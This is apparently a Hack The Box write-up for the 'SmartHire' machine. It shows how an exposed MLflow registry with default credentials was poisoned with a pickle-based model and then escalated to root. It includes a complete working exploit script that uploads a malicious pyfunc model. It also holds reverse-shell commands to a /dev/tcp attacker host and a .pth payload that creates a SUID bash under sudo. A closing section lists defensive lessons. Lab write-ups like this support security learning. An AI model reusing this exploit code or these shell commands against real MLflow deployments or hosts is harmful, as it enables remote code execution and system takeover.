---
title: "HTB - SmartHire"
date: 2026-05-18T00:37:12.823489+03:00
tags: ["HackTheBox", "Linux", "AI", "MlFlow", "Medium"]
categories: ["Machines&Challenges"]
difficulty: "Medium"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/SmartHire.png"
---

# SmartHire HTB Write-up

## Executive Summary

SmartHire was compromised in two stages:

1. **Initial access / user shell**
   The SmartHire web application relied on an external MLflow instance to load a model by name during resume prediction. Because the MLflow registry was exposed and protected only by weak credentials (`admin:password`), it was possible to register a malicious `pyfunc` model under the exact name expected by the application. When the application later loaded that model during a prediction request, it deserialized attacker-controlled pickle content and executed a reverse shell as `svcweb`.

2. **Privilege escalation / root**
   The `svcweb` user belonged to the `devs` group and had write access to `/opt/tools/mlflow_ctl/plugins/dev/`. At the same time, `sudo -l` revealed permission to run `/usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *` as root without a password. By planting a malicious `.pth` file inside the writable plugin directory, code was executed automatically during Python startup, which created a SUID copy of `/bin/bash`. That yielded root immediately.

Recovered flags:

- `user.txt`: `43ec8433ab9c68d793dcb095a5c8f926`
- `root.txt`: `dac25181580d8a1cbdc1e96ac76f3f3a`

## Summary Table

| Item | Value |
|------|-------|
| Machine | `SmartHire` |
| Primary web app | `http://smarthire.htb/` |
| MLflow instance | `http://models.smarthire.htb/` |
| Initial issue | Insecure MLflow model loading / pickle deserialization |
| User shell | `svcweb` |
| Privilege escalation | Writable Python plugin path + root-run Python interpreter + `.pth` execution |
| User flag | `43ec8433ab9c68d793dcb095a5c8f926` |
| Root flag | `dac25181580d8a1cbdc1e96ac76f3f3a` |

## Attack Path Summary

The full compromise path was:

1. Register a SmartHire account.
2. Inspect the dashboard and model state.
3. Identify the model name expected by the application.
4. Authenticate to MLflow with `admin:password`.
5. Upload a malicious MLflow `pyfunc` model containing a pickle RCE payload.
6. Register that payload under the exact model name SmartHire will load.
7. Trigger `/predict` with a valid CSV to force model loading.
8. Catch the reverse shell as `svcweb`.
9. Abuse write access to `/opt/tools/mlflow_ctl/plugins/dev/`.
10. Trigger root-owned Python via `sudo`.
11. Use `.pth` startup execution to create a SUID bash.
12. Read `user.txt` and `root.txt`.

## Enumeration

### Web targets

The two important hosts were:

- `http://smarthire.htb/`
- `http://models.smarthire.htb/`

The first served the SmartHire application, and the second served the MLflow UI and API.

### VHost discovery

The MLflow subdomain was identified with virtual host enumeration:

```bash
gobuster vhost -u http://smarthire.htb --ad -w subdomains-top1million-20000.txt -t 50
```

Observed output:

```text
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://smarthire.htb
[+] Method:                    GET
[+] Threads:                   50
[+] Wordlist:                  subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
models.smarthire.htb Status: 401 [Size: 137]
Progress: 20000 / 20000 (100.00%)
```

The important point here is not the `401` by itself, but that `models.smarthire.htb` was a valid virtual host and clearly exposed a separate authenticated service. That gave the missing domain needed to pivot into MLflow.

### SmartHire application behavior

The SmartHire frontend exposed:

- `/register`
- `/login`
- `/dashboard`
- `/predict`
- `/model_info`

The dashboard allowed users to train or upload hiring data, while the prediction page accepted a single CSV resume input. The important detail was that SmartHire tracked an application-specific model name and attempted to load that model when prediction requests were made.

During the live solve, the authenticated model state endpoint returned:

```json
{"model_info":null,"model_name":"acme-38f2fd64a44d-model","status":"success"}
```

That response removed any guesswork. Instead of training a normal model and then replacing it, the attack could directly poison the model name that the application already expected.

### MLflow exposure

The MLflow instance was externally reachable and accepted:

```text
admin:password
```

That was sufficient to:

- create experiments
- create runs
- upload artifacts
- create registered models
- create model versions

This was the critical trust boundary failure. SmartHire relied on model artifacts from a registry the attacker could write to.

## Initial Access

### Root cause

The initial shell came from unsafe model deserialization inside MLflow model loading. A malicious `pyfunc` model was built with a pickled Python object whose `__reduce__` method returned `os.system()` plus an attacker-controlled command.

When MLflow loaded the model, Python deserialized the pickle and executed the command immediately.

### Malicious model structure

The attack used a minimal MLflow model artifact layout:

- `MLmodel`
- `python_model.pkl`
- `conda.yaml`
- `python_env.yaml`
- `requirements.txt`

The important file was `python_model.pkl`, which contained the payload object.

Core payload logic:

```python
class Payload:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))
```

This is enough to convert deserialization into command execution.

### Exploit script

The final exploit used is stored at [smarthire_mlflow_rce.py](/home/kali/Desktop/smarthire_mlflow_rce.py).

It does the following:

1. creates or reuses an experiment
2. creates a new run
3. builds a malicious model artifact locally
4. uploads the artifact files through the MLflow artifact API
5. creates or reuses the registered model
6. creates a model version pointing at the malicious artifact source

Because local name resolution was slightly awkward in this environment, the exploit was updated to support an explicit `Host` header while targeting the box IP directly.

### Listener

Start a listener first:

```bash
rlwrap nc -lvnp 4444
```

### Registering the malicious model

The application-specific model name from `/model_info` was:

```text
acme-38f2fd64a44d-model
```

The malicious model was registered with:

```bash
python3 smarthire_mlflow_rce.py \
  -t http://10.129.41.7 \
  -a admin:password \
  --host-header models.smarthire.htb \
  -n acme-38f2fd64a44d-model \
  -c 'bash -c "bash -i >& /dev/tcp/10.10.16.14/4444 0>&1"'
```

Observed output:

```text
[+] experiment_id = 779849894136960395
[+] run_id       = 7a5b65ed30b845dab116ebacc6cc757d
[+] artifact_uri = mlflow-artifacts:/779849894136960395/7a5b65ed30b845dab116ebacc6cc757d/artifacts
[+] uploaded model/MLmodel
[+] uploaded model/conda.yaml
[+] uploaded model/python_env.yaml
[+] uploaded model/python_model.pkl
[+] uploaded model/requirements.txt
[+] registered 'acme-38f2fd64a44d-model' version 1
```

At this point, the payload was staged but not yet executed. Execution would occur only once SmartHire loaded the poisoned model.

### Triggering execution

The prediction endpoint expected a CSV file using the format shown in the app:

```csv
name,skills,experience,education,position_applied,previous_company
John Smith,"Python, Machine Learning, SQL",60,Masters in CS,Data Scientist,TechCorp
```

Submitting that CSV to `/predict` caused the SmartHire backend to load the registered model and triggered the reverse shell.

### Reverse shell

The shell connected back as:

```text
svcweb
```

Interactive confirmation:

```text
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

Working directory:

```text
/var/www/smarthire.htb
```

### User flag

Read the flag:

```bash
cat /home/svcweb/user.txt
```

Flag:

```text
43ec8433ab9c68d793dcb095a5c8f926
```

## Privilege Escalation

### Sudo rights

From the `svcweb` shell:

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for svcweb on smarthire:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

This was immediately interesting because root was willing to start a Python interpreter on a script within a custom application environment.

### Writable plugin path

The next key check:

```bash
ls -ld /opt/tools/mlflow_ctl/plugins/dev
```

Output:

```text
drwxrwxr-x 2 root devs 4096 May 12 15:22 /opt/tools/mlflow_ctl/plugins/dev
```

Because `svcweb` was in the `devs` group, that directory was writable.

### Why `.pth` files matter

When Python initializes the `site` module, it processes `.pth` files in relevant package directories. Any line beginning with `import` is executed. That means a writable directory included in Python’s startup path can become a code-execution primitive before the target script even begins its own logic.

This turned the privesc into:

- write one line of Python into a `.pth` file
- start the allowed root-owned Python command
- let interpreter startup execute the payload

### Payload

The `.pth` file used:

```python
import os; os.system('cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash')
```

This copies `/bin/bash` to `/tmp/rootbash` and marks it SUID so it runs with effective UID 0.

### Exploitation steps

Write the malicious `.pth` file:

```bash
echo "import os; os.system('cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash')" > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth
```

Trigger the allowed root command:

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

Observed output:

```text
[*] Checking MLflow service status...

[+] MLflow service status: active
[+] MLflow container status: 'Up 10 hours'
```

The command looked normal, which is ideal. The malicious code executed during interpreter initialization, not as noisy output inside the tool itself.

### Root shell

Check the generated SUID binary:

```bash
ls -l /tmp/rootbash
```

Observed:

```text
-rwsr-sr-x 1 root root 1396520 May 17 21:19 /tmp/rootbash
```

Use it:

```bash
/tmp/rootbash -p
```

Or in one shot:

```bash
/tmp/rootbash -p -c 'id; cat /root/root.txt'
```

Observed privilege level:

```text
uid=1000(svcweb) gid=1000(svcweb) euid=0(root) egid=0(root) groups=0(root),1000(svcweb),1001(mlflowweb),1002(devs)
```

### Root flag

Read:

```bash
cat /root/root.txt
```

Flag:

```text
dac25181580d8a1cbdc1e96ac76f3f3a
```

## Why the Box Fell

### User compromise

The user compromise was possible because several weak assumptions lined up:

- SmartHire trusted an externally managed model registry.
- The MLflow registry was reachable by an attacker.
- The registry used weak credentials.
- The target model name could be learned from the application.
- Model loading involved attacker-controlled pickle content.

Any one of those controls being removed would likely have broken the attack chain.

### Root compromise

The root compromise happened because:

- `svcweb` had write access to a Python-related plugin path.
- root was allowed to run a Python entrypoint via `sudo`.
- Python startup executed `.pth` imports automatically.
- no separation existed between trusted root-run Python paths and user-writable directories.

This was a clean example of how dangerous interpreter startup behavior becomes when filesystem permissions are too loose.

## Defensive Lessons

### MLflow / model security

- Never let low-trust users register or replace models used by production workloads.
- Avoid loading models from registries writable by general application users.
- Treat pickle-backed model formats as code, not data.
- Restrict MLflow artifact upload, model registration, and version creation.
- Remove default or weak credentials immediately.

### Privilege separation

- Do not allow root-run Python workflows to import from user-writable directories.
- Audit `.pth`, `.egg-link`, plugin, and `site-packages` style paths for write access.
- Review `sudo` permissions involving interpreters and framework wrappers.
- Prefer static binaries or tightly controlled service helpers for privileged maintenance tasks.

## Commands Recap

```bash
rlwrap nc -lvnp 4444
python3 smarthire_mlflow_rce.py -t http://10.129.41.7 -a admin:password --host-header models.smarthire.htb -n acme-38f2fd64a44d-model -c 'bash -c "bash -i >& /dev/tcp/10.10.16.14/4444 0>&1"'
echo "import os; os.system('cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash')" > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
/tmp/rootbash -p -c 'id; cat /root/root.txt'
```

## Source Code

### `smarthire_mlflow_rce.py`

```python
#!/usr/bin/env python3
"""
Hack The Box - SmartHire

Abuses vulnerable MLflow model loading by uploading a malicious pyfunc model
artifact, then registering a model version that will execute a command when the
server loads it.

Usage example:
  python3 smarthire_mlflow_rce.py \
    -t http://models.smarthire.htb \
    -a admin:password \
    -n returned-model-name \
    -c 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
"""

import argparse
import os
import pickle
import sys
import tempfile
from pathlib import Path
from urllib.parse import urlparse

import requests

AUTH = None
SESSION = requests.Session()


class Payload:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


MLMODEL = """\
artifact_path: model
flavors:
  python_function:
    cloudpickle_version: 2.2.1
    env:
      conda: conda.yaml
      virtualenv: python_env.yaml
    loader_module: mlflow.pyfunc.model
    python_model: python_model.pkl
    python_version: 3.10.12
mlflow_version: 2.13.0
model_uuid: 0123456789abcdef0123456789abcdef
run_id: {run_id}
utc_time_created: '2026-05-16 00:00:00.000000'
"""

PYTHON_ENV = """\
python: 3.10.12
build_dependencies:
  - pip
dependencies:
  - -r requirements.txt
"""

REQS = "mlflow\ncloudpickle\n"

CONDA = """\
channels: [conda-forge]
dependencies:
  - python=3.10.12
  - pip
name: mlflow-env
"""


def build_artifacts(cmd, run_id, dest):
    dest.mkdir(parents=True, exist_ok=True)

    with open(dest / "python_model.pkl", "wb") as f:
        pickle.dump(Payload(cmd), f)

    (dest / "MLmodel").write_text(MLMODEL.format(run_id=run_id))
    (dest / "python_env.yaml").write_text(PYTHON_ENV)
    (dest / "requirements.txt").write_text(REQS)
    (dest / "conda.yaml").write_text(CONDA)


def parse_auth(auth_value):
    if not auth_value:
        return None

    user, sep, password = auth_value.partition(":")
    if not sep:
        raise ValueError("Auth must be in user:pass format")
    return (user, password)


def post_json(base, path, body):
    response = SESSION.post(f"{base}{path}", json=body, auth=AUTH, timeout=30)
    response.raise_for_status()
    return response.json() if response.text else {}


def get_json(base, path, params=None):
    response = SESSION.get(f"{base}{path}", params=params, auth=AUTH, timeout=30)
    response.raise_for_status()
    return response.json()


def ensure_experiment(base, name):
    try:
        result = get_json(
            base,
            "/api/2.0/mlflow/experiments/get-by-name",
            {"experiment_name": name},
        )
        return result["experiment"]["experiment_id"]
    except requests.HTTPError:
        result = post_json(
            base, "/api/2.0/mlflow/experiments/create", {"name": name}
        )
        return result["experiment_id"]


def create_run(base, experiment_id):
    result = post_json(
        base,
        "/api/2.0/mlflow/runs/create",
        {"experiment_id": experiment_id, "start_time": 0},
    )
    return result["run"]


def upload_artifact(base, artifact_uri, relative_path, local_file):
    parsed = urlparse(artifact_uri)
    url = f"{base}/api/2.0/mlflow-artifacts/artifacts{parsed.path}/{relative_path}"

    with open(local_file, "rb") as f:
        response = SESSION.put(url, data=f.read(), auth=AUTH, timeout=60)

    response.raise_for_status()


def register_model(base, model_name):
    try:
        post_json(base, "/api/2.0/mlflow/registered-models/create", {"name": model_name})
    except requests.HTTPError:
        pass


def create_model_version(base, model_name, source, run_id):
    result = post_json(
        base,
        "/api/2.0/mlflow/model-versions/create",
        {"name": model_name, "source": source, "run_id": run_id},
    )
    return result["model_version"]["version"]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-t",
        "--target",
        required=True,
        help="MLflow base URL, for example http://models.smarthire.htb",
    )
    parser.add_argument(
        "-c",
        "--cmd",
        required=True,
        help="Command to execute when the target loads the model",
    )
    parser.add_argument(
        "-e",
        "--experiment",
        default="pwn",
        help="Experiment name to create or reuse",
    )
    parser.add_argument(
        "-n",
        "--model-name",
        required=True,
        help="Model name expected by the SmartHire application",
    )
    parser.add_argument(
        "-a",
        "--auth",
        default=None,
        help="Basic auth in user:pass format",
    )
    parser.add_argument(
        "--host-header",
        default=None,
        help="Optional Host header for IP-based access to a vhost",
    )
    args = parser.parse_args()

    global AUTH
    AUTH = parse_auth(args.auth)
    base = args.target.rstrip("/")

    if args.host_header:
        SESSION.headers.update({"Host": args.host_header})

    experiment_id = ensure_experiment(base, args.experiment)
    print(f"[+] experiment_id = {experiment_id}")

    run = create_run(base, experiment_id)
    run_id = run["info"]["run_id"]
    artifact_uri = run["info"]["artifact_uri"]
    print(f"[+] run_id       = {run_id}")
    print(f"[+] artifact_uri = {artifact_uri}")

    with tempfile.TemporaryDirectory() as tmp_dir:
        model_dir = Path(tmp_dir) / "model"
        build_artifacts(args.cmd, run_id, model_dir)

        for file_path in sorted(model_dir.iterdir()):
            upload_artifact(base, artifact_uri, f"model/{file_path.name}", file_path)
            print(f"[+] uploaded model/{file_path.name}")

    register_model(base, args.model_name)

    source = f"{artifact_uri}/model"
    version = create_model_version(base, args.model_name, source, run_id)
    print(f"[+] registered '{args.model_name}' version {version}")
    print("[*] Payload will fire when the server loads this model version.")
    print(f"[*] Example trigger path: models:/{args.model_name}/{version}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

### `.pth` payload used for privilege escalation

```python
import os; os.system('cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash')
```

### Prediction CSV used to trigger model loading

```csv
name,skills,experience,education,position_applied,previous_company
John Smith,"Python, Machine Learning, SQL",60,Masters in CS,Data Scientist,TechCorp
```

## Final Notes

The initial foothold was not just “an MLflow bug.” The real issue was the application design: SmartHire trusted a model registry that attackers could directly modify. Once that trust boundary was broken, the rest of the foothold became predictable. The privilege escalation then compounded the same pattern at the operating-system level: a root-run Python workflow trusted a path writable by a less privileged user.

Both halves of the box are good examples of the same general rule:

- if code-loading paths are attacker-controlled, compromise is usually only a matter of timing
